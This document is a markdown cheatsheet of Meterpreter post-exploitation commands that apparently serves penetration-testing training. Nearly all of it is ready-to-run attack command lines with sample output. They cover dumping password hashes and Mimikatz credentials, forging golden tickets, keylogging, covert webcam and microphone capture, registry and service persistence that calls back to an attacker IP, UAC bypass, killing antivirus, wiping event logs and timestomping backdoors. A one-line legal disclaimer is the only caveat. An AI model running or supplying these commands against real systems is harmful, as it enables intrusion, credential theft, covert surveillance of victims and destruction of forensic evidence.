# 🎭 Meterpreter - Complete Cheatsheet

```
    ███╗   ███╗███████╗████████╗███████╗██████╗ ██████╗ ██████╗ ███████╗████████╗███████╗██████╗ 
    ████╗ ████║██╔════╝╚══██╔══╝██╔════╝██╔══██╗██╔══██╗██╔══██╗██╔════╝╚══██╔══╝██╔════╝██╔══██╗
    ██╔████╔██║█████╗     ██║   █████╗  ██████╔╝██████╔╝██████╔╝█████╗     ██║   █████╗  ██████╔╝
    ██║╚██╔╝██║██╔══╝     ██║   ██╔══╝  ██╔══██╗██╔═══╝ ██╔══██╗██╔══╝     ██║   ██╔══╝  ██╔══██╗
    ██║ ╚═╝ ██║███████╗   ██║   ███████╗██║  ██║██║     ██║  ██║███████╗   ██║   ███████╗██║  ██║
    ╚═╝     ╚═╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
```

![Meterpreter](https://img.shields.io/badge/Meterpreter-Session-purple?style=for-the-badge)
![Post Exploitation](https://img.shields.io/badge/Post-Exploitation-orange?style=for-the-badge)
![Metasploit](https://img.shields.io/badge/Metasploit-Framework-blue?style=for-the-badge)
![Windows](https://img.shields.io/badge/Windows-Linux-green?style=for-the-badge)

> **The ultimate post-exploitation tool** - Your complete arsenal after gaining access

---

## 📋 Table of Contents

- [What is Meterpreter?](#-what-is-meterpreter)
- [Core Commands](#-core-commands)
- [System Information](#-system-information)
- [File System Commands](#-file-system-commands)
- [Network Commands](#-network-commands)
- [Process Commands](#-process-commands)
- [User & Privilege Commands](#-user--privilege-commands)
- [Password Harvesting](#-password-harvesting)
- [Keylogging](#-keylogging)
- [Screenshot & Webcam](#-screenshot--webcam)
- [Persistence](#-persistence)
- [Pivoting & Port Forwarding](#-pivoting--port-forwarding)
- [Anti-Forensics](#-anti-forensics)
- [Scripting & Automation](#-scripting--automation)
- [Quick Reference Table](#-quick-reference-table)
- [Tips & Tricks](#-tips--tricks)

---

## 🎯 What is Meterpreter?

**Meterpreter** (Meta-Interpreter) is an advanced, dynamically extensible payload that operates via in-memory DLL injection and communicates over a stager socket.

### Key Features

| Feature | Description |
|---------|-------------|
| **In-Memory Execution** | Runs entirely in RAM, leaving minimal traces |
| **Encrypted Communication** | TLS encrypted channel to C2 server |
| **Extensible** | Load extensions on-the-fly |
| **Cross-Platform** | Windows, Linux, macOS, Android, PHP, Java |
| **Pivoting Capable** | Route traffic through compromised hosts |

### Meterpreter Types

```bash
# Windows
windows/meterpreter/reverse_tcp
windows/x64/meterpreter/reverse_tcp
windows/meterpreter/reverse_https

# Linux
linux/x86/meterpreter/reverse_tcp
linux/x64/meterpreter/reverse_tcp

# macOS
osx/x64/meterpreter/reverse_tcp

# Android
android/meterpreter/reverse_tcp

# PHP
php/meterpreter/reverse_tcp

# Java
java/meterpreter/reverse_tcp

# Python
python/meterpreter/reverse_tcp
```

---

## ⌨️ Core Commands

### Help & Navigation

```bash
# Display all commands
meterpreter > help

# Get help for specific command
meterpreter > help upload

# Show channel information
meterpreter > channel -l
```

### Session Management

```bash
# Get session info
meterpreter > info

# Background current session
meterpreter > background
meterpreter > bg

# Return to msfconsole
meterpreter > exit

# Terminate session completely
meterpreter > quit

# Reconnect if connection drops
meterpreter > transport list
meterpreter > transport add -t reverse_tcp -l <LHOST> -p <LPORT>
```

### Channel Operations

```bash
# List active channels
meterpreter > channel -l

# Interact with channel
meterpreter > channel -i <id>

# Read from channel
meterpreter > channel -r <id>

# Write to channel
meterpreter > channel -w <id>

# Close channel
meterpreter > channel -c <id>
```

---

## 💻 System Information

### Basic System Info

```bash
# Get system information
meterpreter > sysinfo
Computer        : WIN-PC
OS              : Windows 10 (10.0 Build 19041)
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x64/windows

# Get current user
meterpreter > getuid
Server username: WIN-PC\Administrator

# Get current process ID
meterpreter > getpid
Current pid: 1234

# Get process name
meterpreter > getpname

# Check if running in VM
meterpreter > run post/windows/gather/checkvm
```

### Environment & Registry

```bash
# List environment variables
meterpreter > getenv PATH
meterpreter > getenv USERNAME

# Set environment variable
meterpreter > setenv VAR value

# Registry operations (Windows)
meterpreter > reg enumkey -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
meterpreter > reg queryval -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v SecurityHealth
meterpreter > reg setval -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v Backdoor -d "C:\\backdoor.exe"
meterpreter > reg deleteval -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v Backdoor
```

### Installed Software & Patches

```bash
# List installed applications
meterpreter > run post/windows/gather/enum_applications

# List installed patches/hotfixes
meterpreter > run post/windows/gather/enum_patches

# Check for unquoted service paths
meterpreter > run post/windows/gather/enum_unquoted_service_paths
```

---

## 📁 File System Commands

### Navigation

```bash
# Print working directory
meterpreter > pwd
C:\Users\Administrator\Desktop

# List directory contents
meterpreter > ls
meterpreter > ls -la

# Change directory
meterpreter > cd C:\\Users
meterpreter > cd ..

# Show current local directory
meterpreter > lpwd

# Change local directory
meterpreter > lcd /tmp

# List local directory
meterpreter > lls
```

### File Operations

```bash
# Read file contents
meterpreter > cat C:\\Users\\Administrator\\Desktop\\secret.txt

# Edit file
meterpreter > edit C:\\file.txt

# Delete file
meterpreter > rm C:\\temp\\malware.exe

# Create directory
meterpreter > mkdir C:\\temp\\hidden

# Remove directory
meterpreter > rmdir C:\\temp\\hidden

# Copy file
meterpreter > cp source.txt destination.txt

# Move/rename file
meterpreter > mv oldname.txt newname.txt
```

### File Transfer

```bash
# Download file from target
meterpreter > download C:\\Users\\Administrator\\Desktop\\passwords.txt
meterpreter > download C:\\Users\\Administrator\\Desktop\\passwords.txt /tmp/

# Download recursively
meterpreter > download -r C:\\Users\\Administrator\\Documents

# Upload file to target
meterpreter > upload /tmp/backdoor.exe C:\\Windows\\Temp\\
meterpreter > upload -r /local/directory C:\\remote\\directory

# Show download/upload progress
meterpreter > download -p C:\\large_file.zip
```

### File Search

```bash
# Search for files
meterpreter > search -f *.txt
meterpreter > search -f password* -d C:\\Users
meterpreter > search -f *.docx -d C:\\

# Search with specific extension in all drives
meterpreter > search -f *.kdbx

# Search for specific filename patterns
meterpreter > search -f *password* -r
```

### File Hashing & Timestamps

```bash
# Get file checksum
meterpreter > checksum md5 C:\\Windows\\System32\\cmd.exe
meterpreter > checksum sha1 C:\\Windows\\System32\\cmd.exe
meterpreter > checksum sha256 C:\\file.exe

# Modify timestamps (timestomp)
meterpreter > timestomp C:\\backdoor.exe -f C:\\Windows\\System32\\cmd.exe
meterpreter > timestomp C:\\backdoor.exe -z "01/01/2020 00:00:00"
meterpreter > timestomp C:\\backdoor.exe -m "01/01/2020 00:00:00"
meterpreter > timestomp C:\\backdoor.exe -a "01/01/2020 00:00:00"
meterpreter > timestomp C:\\backdoor.exe -c "01/01/2020 00:00:00"
```

---

## 🌐 Network Commands

### Network Information

```bash
# Get network interfaces
meterpreter > ipconfig
meterpreter > ifconfig

# Get routing table
meterpreter > route

# Get ARP cache
meterpreter > arp

# Get active network connections
meterpreter > netstat
```

### Port Forwarding

```bash
# Forward local port to remote
meterpreter > portfwd add -l 8080 -p 80 -r 192.168.1.100

# List port forwards
meterpreter > portfwd list

# Delete port forward
meterpreter > portfwd delete -l 8080 -p 80 -r 192.168.1.100

# Flush all port forwards
meterpreter > portfwd flush

# Example: Forward RDP
meterpreter > portfwd add -l 3389 -p 3389 -r 10.10.10.5
# Now connect: rdesktop 127.0.0.1:3389
```

### DNS & Network Utilities

```bash
# Resolve hostname
meterpreter > resolve google.com

# Get proxy settings
meterpreter > run post/windows/gather/enum_proxy
```

---

## ⚙️ Process Commands

### Process Listing

```bash
# List all processes
meterpreter > ps

# Filter processes
meterpreter > pgrep explorer.exe
meterpreter > pgrep -u Administrator

# Get current process info
meterpreter > getpid
```

### Process Manipulation

```bash
# Migrate to another process
meterpreter > migrate <PID>
meterpreter > migrate -N explorer.exe

# Kill a process
meterpreter > kill <PID>

# Execute command and get output
meterpreter > execute -f cmd.exe -a "/c whoami" -i -H

# Execute in background
meterpreter > execute -f notepad.exe -H

# Execute with channelized I/O
meterpreter > execute -f cmd.exe -c -i
```

### Process Migration Tips

```bash
# Safe migration targets (Windows)
# - explorer.exe (user context, stable)
# - svchost.exe (SYSTEM, multiple instances)
# - lsass.exe (SYSTEM, required for hashdump)

# Find explorer.exe and migrate
meterpreter > ps | grep explorer
meterpreter > migrate <explorer_pid>

# Auto-migrate to stable process
meterpreter > run post/windows/manage/migrate
```

---

## 👤 User & Privilege Commands

### Current User Info

```bash
# Get current user
meterpreter > getuid
Server username: WIN-PC\Administrator

# Get current privileges
meterpreter > getprivs

# Check if elevated (Windows)
meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation)
```

### Privilege Escalation

```bash
# Attempt to get SYSTEM privileges
meterpreter > getsystem
meterpreter > getsystem -t 1  # Named Pipe Impersonation (In Memory/Admin)
meterpreter > getsystem -t 2  # Named Pipe Impersonation (Dropper/Admin)
meterpreter > getsystem -t 3  # Token Duplication (In Memory/Admin)

# UAC bypass (from msfconsole)
msf6 > use exploit/windows/local/bypassuac_eventvwr
msf6 > set SESSION 1
msf6 > exploit

# Local exploit suggester
meterpreter > run post/multi/recon/local_exploit_suggester

# Steal token from another process
meterpreter > steal_token <PID>

# Drop stolen token
meterpreter > drop_token

# Impersonate user
meterpreter > impersonate_token "DOMAIN\\Administrator"

# List available tokens
meterpreter > use incognito
meterpreter > list_tokens -u
```

### User Enumeration

```bash
# List local users
meterpreter > run post/windows/gather/enum_logged_on_users

# List domain users (if domain joined)
meterpreter > run post/windows/gather/enum_domain_users

# List local groups
meterpreter > run post/windows/gather/local_admin_search_enum
```

---

## 🔐 Password Harvesting

### Hash Dumping

```bash
# Dump password hashes (requires SYSTEM)
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
user:1001:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::

# If hashdump fails, try
meterpreter > run post/windows/gather/smart_hashdump
```

### Mimikatz / Kiwi Extension

```bash
# Load Kiwi (Mimikatz)
meterpreter > load kiwi

# Retrieve all credentials
meterpreter > creds_all

# Get password from memory
meterpreter > kiwi_cmd sekurlsa::logonpasswords

# Dump Kerberos tickets
meterpreter > kiwi_cmd sekurlsa::tickets

# Get WiFi passwords
meterpreter > kiwi_cmd misc::wifi

# LSA dump
meterpreter > lsa_dump_sam
meterpreter > lsa_dump_secrets

# Golden ticket
meterpreter > golden_ticket_create -d domain.local -k <krbtgt_hash> -s <domain_sid> -u Administrator -t /tmp/golden.kirbi
```

### Credential Collection

```bash
# Search for credentials in files
meterpreter > run post/multi/gather/credentials/generic

# Browser credentials
meterpreter > run post/multi/gather/firefox_creds
meterpreter > run post/windows/gather/enum_chrome

# SSH keys
meterpreter > run post/multi/gather/ssh_creds

# Windows Credential Manager
meterpreter > run post/windows/gather/enum_cred_store

# Outlook credentials
meterpreter > run post/windows/gather/credentials/outlook
```

---

## ⌨️ Keylogging

### Start/Stop Keylogger

```bash
# Start keylogger
meterpreter > keyscan_start
Starting the keystroke sniffer...

# Dump captured keystrokes
meterpreter > keyscan_dump
Dumping captured keystrokes...
username: admin
password: secretpass123

# Stop keylogger
meterpreter > keyscan_stop
Stopping the keystroke sniffer...
```

### Advanced Keylogging

```bash
# Run keylogger as separate process
meterpreter > run post/windows/capture/keylog_recorder

# Migrate to process with keyboard access (explorer.exe)
meterpreter > migrate -N explorer.exe
meterpreter > keyscan_start
```

---

## 📸 Screenshot & Webcam

### Screenshots

```bash
# Take single screenshot
meterpreter > screenshot
Screenshot saved to: /root/screenshot.jpeg

# Take screenshot with custom path
meterpreter > screenshot -p /tmp/screen.jpg

# Continuous screenshots
meterpreter > run post/multi/gather/screen_spy

# View real-time desktop
meterpreter > screenshare
```

### Webcam Operations

```bash
# List webcams
meterpreter > webcam_list
1: Integrated Webcam

# Take snapshot from webcam
meterpreter > webcam_snap
[*] Starting...
[+] Got frame
[*] Stopped
Webcam shot saved to: /root/webcam.jpeg

# Take snapshot with options
meterpreter > webcam_snap -i 1 -p /tmp/webcam.jpg

# Stream webcam (real-time)
meterpreter > webcam_stream
```

### Audio Recording

```bash
# Record microphone
meterpreter > record_mic -d 30
[*] Starting...
[*] Stopped
Audio saved to: /root/audio.wav

# Record with custom duration
meterpreter > record_mic -d 60 -f /tmp/recording.wav
```

---

## 🔄 Persistence

### Windows Persistence

```bash
# Registry persistence
meterpreter > run persistence -X -i 10 -p 4444 -r 192.168.1.50

# Scheduled task persistence
meterpreter > run post/windows/manage/persistence_exe

# Service persistence
meterpreter > run metsvc

# WMI persistence
meterpreter > run post/windows/manage/wmi_persistence
```

### Persistence Options Explained

```bash
# persistence script options
-A        # Automatically start a matching handler
-L <path> # Location to write payload
-P <path> # Payload to use
-S        # Start as service (with SYSTEM)
-T        # Alternate EXE template
-U        # Start on user login
-X        # Start on system boot
-i <sec>  # Interval between connection attempts
-p <port> # Port for payload to connect to
-r <ip>   # IP for payload to connect to
```

### Remove Persistence

```bash
# List persistence mechanisms
meterpreter > run post/windows/gather/enum_persistence

# Clean persistence (manual)
meterpreter > reg deleteval -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v Backdoor
```

---

## 🔀 Pivoting & Port Forwarding

### Route Management

```bash
# Add route through session
meterpreter > run autoroute -s 10.10.10.0/24

# View routes
meterpreter > run autoroute -p

# Delete route
meterpreter > run autoroute -d -s 10.10.10.0/24

# From msfconsole
msf6 > route add 10.10.10.0 255.255.255.0 1
msf6 > route print
```

### SOCKS Proxy

```bash
# Start SOCKS proxy (from msfconsole)
msf6 > use auxiliary/server/socks_proxy
msf6 > set SRVPORT 1080
msf6 > set VERSION 4a
msf6 > run -j

# Configure proxychains
# Edit /etc/proxychains.conf:
# socks4 127.0.0.1 1080

# Use with proxychains
proxychains nmap -sT -Pn 10.10.10.0/24
proxychains ssh user@10.10.10.5
```

### Port Forwarding Examples

```bash
# Forward local port to internal host
meterpreter > portfwd add -l 445 -p 445 -r 10.10.10.5

# Reverse port forward
meterpreter > portfwd add -R -l 8080 -p 80 -L 192.168.1.50

# Example scenarios:
# Access internal web server
meterpreter > portfwd add -l 8080 -p 80 -r 10.10.10.100

# Access internal RDP
meterpreter > portfwd add -l 33389 -p 3389 -r 10.10.10.5

# Access internal SMB
meterpreter > portfwd add -l 1445 -p 445 -r 10.10.10.5
```

---

## 🧹 Anti-Forensics

### Clear Evidence

```bash
# Clear Windows event logs
meterpreter > clearev
[*] Wiping 1234 records from Application...
[*] Wiping 5678 records from System...
[*] Wiping 9012 records from Security...

# Timestomp files
meterpreter > timestomp C:\\backdoor.exe -f C:\\Windows\\System32\\calc.exe
```

### Evasion Techniques

```bash
# Migrate to legitimate process
meterpreter > migrate -N svchost.exe

# Check if being monitored
meterpreter > run post/windows/gather/enum_av

# Disable AV (risky)
meterpreter > run post/windows/manage/killav

# Hide process
meterpreter > run post/windows/manage/inject_host
```

---

## 📜 Scripting & Automation

### Resource Scripts

```bash
# Create resource script
echo "sysinfo
getuid
hashdump
run post/windows/gather/enum_logged_on_users" > post_exploit.rc

# Run resource script
meterpreter > resource post_exploit.rc
```

### Common Scripts

```bash
# System enumeration
meterpreter > run scraper

# Gather everything
meterpreter > run winenum

# Check for VMs
meterpreter > run checkvm

# Get local subnets for pivoting
meterpreter > run get_local_subnets

# Multi reconnaissance
meterpreter > run post/multi/recon/local_exploit_suggester
```

### IRB Shell (Ruby)

```bash
# Enter IRB mode
meterpreter > irb

# Example: List files
>> client.fs.dir.entries("C:\\")

# Example: Read file
>> client.fs.file.open("C:\\secret.txt").read

# Exit IRB
>> exit
```

---

## 📊 Quick Reference Table

### Essential Commands

| Command | Description |
|---------|-------------|
| `sysinfo` | System information |
| `getuid` | Current user |
| `getpid` | Current process ID |
| `ps` | List processes |
| `migrate <PID>` | Move to another process |
| `getsystem` | Escalate to SYSTEM |
| `hashdump` | Dump password hashes |
| `shell` | Drop to system shell |
| `upload <src> <dst>` | Upload file |
| `download <src>` | Download file |
| `screenshot` | Capture screen |
| `webcam_snap` | Webcam snapshot |
| `keyscan_start` | Start keylogger |
| `keyscan_dump` | Get keystrokes |

### File Operations

| Command | Description |
|---------|-------------|
| `pwd` | Print working directory |
| `cd <dir>` | Change directory |
| `ls` | List files |
| `cat <file>` | Read file |
| `edit <file>` | Edit file |
| `rm <file>` | Delete file |
| `mkdir <dir>` | Create directory |
| `search -f <pattern>` | Search files |

### Network Operations

| Command | Description |
|---------|-------------|
| `ipconfig` | Network interfaces |
| `route` | Routing table |
| `netstat` | Active connections |
| `portfwd add -l <lport> -p <rport> -r <rhost>` | Forward port |
| `run autoroute -s <subnet>` | Add route for pivoting |

### Privilege Escalation

| Command | Description |
|---------|-------------|
| `getsystem` | Get SYSTEM privileges |
| `getprivs` | List current privileges |
| `steal_token <PID>` | Steal token from process |
| `load incognito` | Load incognito extension |
| `list_tokens -u` | List available tokens |
| `impersonate_token` | Impersonate user token |

### Credential Harvesting

| Command | Description |
|---------|-------------|
| `hashdump` | Dump SAM hashes |
| `load kiwi` | Load Mimikatz |
| `creds_all` | All credentials |
| `lsa_dump_sam` | LSA SAM dump |
| `kiwi_cmd <cmd>` | Run Mimikatz command |

---

## 💡 Tips & Tricks

### Best Practices

1. **Always Migrate First**
   ```bash
   # Migrate to stable process before doing anything
   meterpreter > migrate -N explorer.exe
   ```

2. **Background Sessions**
   ```bash
   # Don't close sessions, background them
   meterpreter > background
   ```

3. **Use Encrypted Payloads**
   ```bash
   # Prefer HTTPS payloads
   windows/meterpreter/reverse_https
   ```

4. **Check Before Acting**
   ```bash
   # Always check privileges
   meterpreter > getuid
   meterpreter > getprivs
   ```

### Troubleshooting

| Issue | Solution |
|-------|----------|
| Session dies | Migrate to stable process |
| hashdump fails | Get SYSTEM first with `getsystem` |
| getsystem fails | Try different technique `-t 1,2,3` |
| Keylogger empty | Migrate to explorer.exe |
| Commands timeout | Check network connectivity |

### Stealth Tips

```bash
# 1. Migrate away from initial process
meterpreter > migrate -N svchost.exe

# 2. Clear tracks
meterpreter > clearev

# 3. Use timestomp on uploaded files
meterpreter > timestomp C:\\file.exe -f C:\\Windows\\System32\\calc.exe

# 4. Delete dropped files when done
meterpreter > rm C:\\temp\\payload.exe
```

---

## ⚠️ Legal Disclaimer

> **WARNING:** This cheatsheet is for educational and authorized penetration testing purposes only. Unauthorized access to computer systems is illegal. Always obtain proper authorization before testing.

---

## 📚 Related Resources

- [Metasploit Framework Guide](./README.md)
- [Offensive Security Documentation](https://www.offensive-security.com/)
- [Rapid7 Metasploit Documentation](https://docs.metasploit.com/)

---

<p align="center">
  <b>🎭 Master the Post-Exploitation Game!</b><br>
  <i>With Meterpreter, the real fun begins after initial access</i>
</p>
